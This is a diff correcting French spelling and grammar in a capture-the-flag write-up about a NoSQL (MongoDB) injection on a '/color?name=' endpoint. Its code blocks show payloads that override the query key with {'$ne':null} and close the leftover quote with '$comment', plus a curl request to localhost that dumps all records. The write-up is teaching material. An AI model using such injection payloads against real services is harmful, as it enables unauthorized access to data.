@@ -2,9 +2,9 @@
 
 ## Write-up
 
-En visitant le site, on remaruqe des boutons permettant de changer les couleurs de la page.
+En visitant le site, on remarque des boutons permettant de changer les couleurs de la page.
 
-En regargant le code source, on remaque que l'on fait une requête au serveur pour récupérer les couleurs, on peut voir qu'un objet est retournée.
+En regardant le code source, on remarque qu'une requête est faite au serveur pour récupérer les couleurs, et on peut voir qu'un objet est retourné.
 
 ```json
 {
@@ -14,28 +14,28 @@ En regargant le code source, on remaque que l'on fait une requête au serveur po
 }
 ```
 
-La clé `_id` fait penser à mongodb, on peut donc essayer de faire une injection.
+La clé `_id` fait penser à MongoDB, on peut donc essayer de faire une injection.
 
-On voit que la requète est sous le format `/color?name=...` et que le code en javascript s'attend à recevoir un tableau. 
+On voit que la requête est au format `/color?name=...` et que le code en JavaScript s'attend à recevoir un tableau.
 
-On pourrait donc imaginer un filtre et récupérer toute les couleurs:
+On pourrait donc imaginer un filtre pour récupérer toutes les couleurs :
 
 ```sh
 # /color?name={"$ne":null}
 /color?name=%7B"ne":null%7D
 ```
 
-Sauf que cela nous donne une erreur. En analysant les données que l'on envoi, on remarque que l'on envoie une string, on imagine donc que le serveur rajoute des guillemets autour de notre string.
+Sauf que cela nous donne une erreur. En analysant les données que l'on envoie, on remarque que l'on envoie une chaîne de caractères, ce qui suggère que le serveur ajoute des guillemets autour de notre chaîne.
 
-Le serveur construit donc un filtre ayant le format suivant:
+Le serveur construit donc un filtre ayant le format suivant :
 
 ```
 { "name": "$notre_filtre" }
 ```
 
-Commet on construit un objet, il est possible d'écraser une clé en envoyant un objet avec la même clé.
+Comme on construit un objet, il est possible d'écraser une clé en envoyant un objet avec la même clé.
 
-Nous aurions donc ceci:
+Nous aurions donc ceci :
 
 ```sh
 # /color?name=","name":"{"$ne":null}"
@@ -43,7 +43,7 @@ Nous aurions donc ceci:
 {  "name": "", "name": { "$ne": null }" }
 ```
 
-Soucis, il nous reste un guillemet à fermer. On peut dire que c'est un commentaire;
+Le problème est qu'il nous reste un guillemet à fermer. On peut dire que c'est un commentaire :
 
 ```sh 
 # /color?name=","name":"{"$ne":null}","$comment":""
@@ -51,13 +51,14 @@ Soucis, il nous reste un guillemet à fermer. On peut dire que c'est un commenta
 { "name": "", "name": { "$ne": null }, "$comment": "" }
 ```
 
-On peut donc récupérer toutes les couleurs en envoyant cette requête:
+On peut donc récupérer toutes les couleurs en envoyant cette requête :
 
 ```sh
 $ curl 'http://localhost:3000/color?name=","name":%7B"$ne":null%7D,"$comment":"' | jq
 ```
 
-résultat:
+Résultat:
+
 ```json
 [
   {
